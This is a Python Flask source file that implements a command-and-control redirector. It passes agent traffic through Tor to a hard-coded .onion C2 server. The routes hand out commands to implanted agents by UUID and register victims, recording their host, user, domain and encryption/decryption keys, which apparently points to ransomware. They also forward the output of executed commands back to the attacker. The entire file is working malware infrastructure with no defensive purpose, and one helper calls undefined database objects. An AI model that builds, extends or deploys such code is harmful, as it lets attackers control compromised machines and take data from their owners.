from flask import Flask, Response, request
import requests
import json

app = Flask(__name__)

# .onion C2 server addresses
C2_ONION_BASE = "http://2xilqjkkqz56l5j5gwjxzunximuyfxstsh43zof6unhzhaaok2ukl4ad.onion"
C2_GET_COMMAND_URL = f"{C2_ONION_BASE}/getCommand.php"
C2_REGISTER_URL = f"{C2_ONION_BASE}/register.php"
C2_PAYLOADS_URL = f"{C2_ONION_BASE}/payloads.php"
C2_PAYLOAD_URL = f"{C2_ONION_BASE}/payload.php"
C2_OUTPUT_URL = f"{C2_ONION_BASE}/output.php"  

allowed_ips = ['127.0.0.1', '192.168.1.111', '192.168.1.137', '192.168.1.142', '192.168.1.138']

def make_tor_request(url, method='GET', data=None, params=None):
    """Make a request through Tor to .onion services or regular HTTP"""
    print("make_tor_request called")
    try:
        proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        
        headers = {
            'User-Agent': 'redirector-client',
            'Authorization': request.headers.get('Authorization', '')  # Forward auth header
        }
        
        uuid_header = request.headers.get('X-Agent-UUID')
        if uuid_header:
            headers['X-Agent-UUID'] = uuid_header
        
        if method.upper() == 'GET':
            response = requests.get(
                url,
                params=params,
                headers=headers,
                proxies=proxies,
                timeout=30
            )
            print("GET request made to", url)
            print("Response status code:", response.status_code)
            print("Response:", response)
        elif method.upper() == 'POST':
            if data and isinstance(data, dict):
                headers['Content-Type'] = 'application/json'
                data = json.dumps(data)
            
            print("POST request made to", url)
            print("Headers:", headers)
            print("Data:", data)
            response = requests.post(
                url,
                data=data,
                headers=headers,
                proxies=proxies,
                timeout=30
            )
        else:
            return None, f"Unsupported method: {method}"
        
        return response, None
        
    except Exception as e:
        return None, f"Tor request failed: {str(e)}"



def make_tor_requestGetCommand(url, method='GET', data=None, params=None):
    """Make a request through Tor to .onion services"""
    try:
        proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Accept': 'text/plain,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
       
        print(f"Making Tor request to: {url}")
        # print(f"With params: {params}")
        # print(f"With headers: {headers}")
        # print(f"Using proxies: {proxies}")
        
        if method.upper() == 'GET':
            response = requests.get(
                url,
                params=params,  
                headers=headers,
                proxies=proxies,
                timeout=150,  
                verify=False  
            )
            # print(f"GET request completed. Status: {response.status_code}")
            # print(f"Response headers: {response.headers}")
            print(f"Response content: {response.text[:200]}...")  # Primeros 200 chars
            return response.text, None
            
        elif method.upper() == 'POST':
            if data and isinstance(data, dict):
                headers['Content-Type'] = 'application/json'
                data = json.dumps(data)
            
            response = requests.post(
                url,
                data=data,
                params=params,
                headers=headers,
                proxies=proxies,
                timeout=120,
                verify=False
            )
        else:
            return None, f"Unsupported method: {method}"
        
        return response, None
        
    except requests.exceptions.RequestException as e:
        print(f"Request exception: {e}")
        return None, f"Tor request failed: {str(e)}"
    except Exception as e:
        print(f"General exception: {e}")
        return None, f"Tor request failed: {str(e)}"

# Route that will act as the redirector for commands
@app.route('/getCommand', methods=['GET'])
def redirect_to_c2():
    client_ip = request.remote_addr
    
    try:
        print(f"Received command request from {client_ip}, redirecting to C2 server.")

        # Verificar IP permitida
        if client_ip not in allowed_ips:
            return "Access denied\n", 403

        # Verificar token en el header
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return "Token required\n", 401
        
        token = auth_header.replace('Bearer ', '')
        # if not validate_token(token):  # Asegúrate de tener esta función
        #     return "Invalid token\n", 401

        # Obtener UUID
        uuid = request.args.get('uuid') or request.headers.get('X-Agent-UUID')
        if not uuid:
            return "UUID required\n", 400

        # Forward request to PHP C2 server through Tor
        c2_url = f"{C2_GET_COMMAND_URL}?uuid={uuid}"
        response, error = make_tor_requestGetCommand(c2_url)
        
        if error:
            return f"Error contacting C2 server: {error}", 500

        return response, 200

    except Exception as e:
        return f"Error contacting C2 server: {str(e)}", 500

    

def insert_command(uuid, command):
    """Insert a new command into the database for the given UUID."""
    command_doc = {
        'uuid': uuid,
        'command': command,
        'output': '',
        'status': 'pending',
        'created_at': datetime.utcnow(),
        'executed_at': None,
        'updated_at': datetime.utcnow()
    }
    
    try:
        result = commands_collection.insert_one(command_doc)
        return result.inserted_id
    except pymongo.errors.DuplicateKeyError:
        commands_collection.update_one(
            {'uuid': uuid, 'status': 'pending'},
            {'$set': {
                'command': command,
                'updated_at': datetime.utcnow()
            }}
        )
        return f"Updated existing command for UUID: {uuid}"
    

# Register endpoint - forwards to .onion server
@app.route('/register', methods=['POST'])
def register_payload_endpoint():
    """Endpoint for payloads to register themselves - forwarded to .onion"""
    try:
        client_ip = request.remote_addr
        
        if client_ip not in allowed_ips:
            return "Access denied\n", 403
        
        # Get payload data from request
        if request.is_json:
            payload_data = request.get_json()
        else:
            payload_data = {
                "uuid": request.form.get("uuid"),
                "ips": request.form.get("ips", ""),
                "os": request.form.get("os", ""),
                "user": request.form.get("user", ""),
                "host": request.form.get("host", ""),
                "architecture": request.form.get("architecture", ""),
                "domain": request.form.get("domain", ""),
                "encryption_key": request.form.get("encryption_key", ""),
                "decryption_key": request.form.get("decryption_key", "")
            }
        
        # Forward registration to .onion server
        response, error = make_tor_request(C2_REGISTER_URL, method='POST', data=payload_data)
        
        if error:
            return {"error": error}, 500
        
        # Return the response from the .onion server
        if response.status_code == 200:
            return response.json(), 201
        else:
            return response.text, response.status_code
        
    except Exception as e:
        return {"error": f"Registration error: {str(e)}"}, 500

# Get all payloads - forwarded to .onion server
@app.route('/payloads', methods=['GET'])
def get_payloads():
    """Endpoint to get all registered payloads - forwarded to .onion"""
    try:
        client_ip = request.remote_addr
        
        if client_ip not in allowed_ips:
            return "Access denied\n", 403
        
        # Forward request to .onion server
        response, error = make_tor_request(C2_PAYLOADS_URL)
        
        if error:
            return {"error": error}, 500
        
        if response.status_code == 200:
            return response.json(), 200
        else:
            return response.text, response.status_code
            
    except Exception as e:
        return {"error": f"Error retrieving payloads: {str(e)}"}, 500

# Get specific payload - forwarded to .onion server
@app.route('/payloads/<uuid>', methods=['GET'])
def get_payload(uuid):
    """Endpoint to get a specific payload - forwarded to .onion"""
    try:
        client_ip = request.remote_addr
        
        if client_ip not in allowed_ips:
            return "Access denied\n", 403
        
        # Forward request to .onion server with UUID parameter
        url = f"{C2_PAYLOAD_URL}?uuid={uuid}"
        response, error = make_tor_request(url)
        
        if error:
            return {"error": error}, 500
        
        if response.status_code == 200:
            return response.json(), 200
        else:
            return response.text, response.status_code
            
    except Exception as e:
        return {"error": f"Error retrieving payload: {str(e)}"}, 500
    
    
# @app.route('/sendOutput', methods=['POST'])
# def send_output():
#     """Endpoint for agents to send command execution results back to C2"""
#     client_ip = request.remote_addr
    
#     try:
#         print(f"Received output from {client_ip}, forwarding to C2 server.")

#         if client_ip not in allowed_ips:
#             return "Access denied\n", 403

#         auth_header = request.headers.get('Authorization')
#         if not auth_header or not auth_header.startswith('Bearer '):
#             return "Token required\n", 401
        
#         token = auth_header.replace('Bearer ', '')

#         print("Authorization token received")

#         if request.is_json:
#             print("Output data received as JSON " )
#             print("Request JSON data:", request.get_json()) 
#             output_data = request.get_json()
#         else:
#             print("Output data received as form data")
#             output_data = {
#                 "uuid": request.form.get("uuid"),
#                 "command": request.form.get("command"),
#                 "output": request.form.get("output"),
#                 "status": request.form.get("status", "executed"),  # executed, failed
#                 "exit_code": request.form.get("exit_code", 0)
#             }

#         print("PENE")
#         if not output_data.get('uuid') or not output_data.get('command'):
#             print("UUID and command are required")
#             return "UUID and command are required\n", 400

#         print(f"Forwarding output for UUID: {output_data.get('uuid')}")
#         print(f"Command: {output_data.get('command')[:100]}...")  # Primeros 100 chars
#         print(f"Output length: {len(output_data.get('output', ''))} characters")

#         # Forward output to PHP C2 server through Tor
#         c2_url = f"{C2_ONION_BASE}/output.php"
#         response, error = make_tor_request(c2_url, method='POST', data=output_data)
        
#         if error:
#             print("Error contacting C2 server:", error)
#             return f"Error contacting C2 server: {error}", 500

#         # Return the response from the C2 server
#         if response.status_code == 200:
#             return "Output received successfully\n", 200
#         else:
#             return f"C2 server error: {response.text}", response.status_code

#     except Exception as e:
#         return f"Error sending output to C2 server: {str(e)}", 500


@app.route('/sendOutput', methods=['POST'])
def send_output():
    """Endpoint for agents to send command execution results back to C2"""
    client_ip = request.remote_addr
    try:
        print(f"Received output from {client_ip}, forwarding to C2 server.")
        
        if client_ip not in allowed_ips:
            return "Access denied\n", 403
        
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return "Token required\n", 401
        
        token = auth_header.replace('Bearer ', '')
        print("Authorization token received")
        
        if request.is_json:
            print("Output data received as JSON")
            print("Request JSON data:", request.get_json()) 
            output_data = request.get_json()
        else:
            print("Output data received as form data")
            output_data = {
                "uuid": request.form.get("uuid"),
                "encrypted_data": request.form.get("encrypted_data")
            }
        
        # Validar que tenemos UUID y datos encriptados
        if not output_data.get('uuid'):
            print("UUID is required")
            return "UUID is required\n", 400
        
        if not output_data.get('encrypted_data'):
            print("Encrypted data is required")
            return "Encrypted data is required\n", 400
        
        print(f"Forwarding encrypted output for UUID: {output_data.get('uuid')}")
        print(f"Encrypted data length: {len(output_data.get('encrypted_data', ''))} characters")
        
        # Forward to PHP C2 server through Tor
        c2_url = f"{C2_ONION_BASE}/output.php"
        response, error = make_tor_request(c2_url, method='POST', data=output_data)
        
        if error:
            print("Error contacting C2 server:", error)
            return f"Error contacting C2 server: {error}", 500
        
        if response.status_code == 200:
            return "Output received successfully\n", 200
        else:
            return f"C2 server error: {response.text}", response.status_code
            
    except Exception as e:
        return f"Error sending output to C2 server: {str(e)}", 500
    


# Health check endpoint (now just checks if we can reach .onion services)
@app.route('/health', methods=['GET'])
def health_check():
    try:
        # Test connection to .onion server
        response, error = make_tor_request(C2_GET_COMMAND_URL)
        
        if error:
            onion_status = f"disconnected: {error}"
        else:
            onion_status = "connected"
        
        return {
            "status": "online",
            "onion_services": onion_status,
            "timestamp": "2024-01-01T00:00:00Z"  # You can add datetime if needed
        }
        
    except Exception as e:
        return {
            "status": "online",
            "onion_services": f"disconnected: {str(e)}",
            "timestamp": "2024-01-01T00:00:00Z"
        }

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
